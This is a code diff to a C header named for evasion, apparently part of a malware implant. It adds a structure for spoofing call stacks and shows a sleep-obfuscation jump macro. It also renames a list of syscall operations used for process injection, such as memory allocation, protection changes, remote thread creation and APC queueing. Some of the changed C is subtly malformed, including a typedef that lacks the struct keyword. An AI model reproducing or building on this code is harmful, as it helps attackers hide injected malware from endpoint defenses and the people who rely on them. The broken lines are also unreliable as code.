@@ -1,6 +1,19 @@
 #ifndef EVASION_H
 #define EVASION_H
 
+struct _STACK_FRAME {
+    WCHAR* DllPath;
+    ULONG  Offset;
+    ULONG  TotalSize;
+    BOOL   ReqLoadLib;
+    BOOL   SetsFramePtr;
+    PVOID  ReturnAddress;
+    BOOL   PushRbp;
+    ULONG  CountOfCodes;
+    BOOL   PushRbpIdx;
+};
+typedef _STACK_FRAME STACK_FRAME;
+
 #define OBF_JMP( i, p ) \
     if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
         Ctx[i].Rax = (U_PTR)( p );                 \
@@ -72,17 +85,17 @@ typedef struct _DESCRIPTOR_HOOK {
 #define SY_DOWN   12
 #define SY_RANGE  0xE5
 
-typedef enum ESYS_OPT {
-    syAlloc,
-    syProtect,
-    syWrite,
-    syCrThread,
-    syQueueApc,
-    syOpenThrd,
-    syOpenProc,
-    syMapView,
-    syCrSectn,
-    syLast
+typedef enum Sys {
+    Alloc,
+    Protect,
+    Write,
+    CrThread,
+    QueueApc,
+    OpenThrd,
+    OpenProc,
+    MapView,
+    CrSectn,
+    Last
 };
 
 typedef struct {
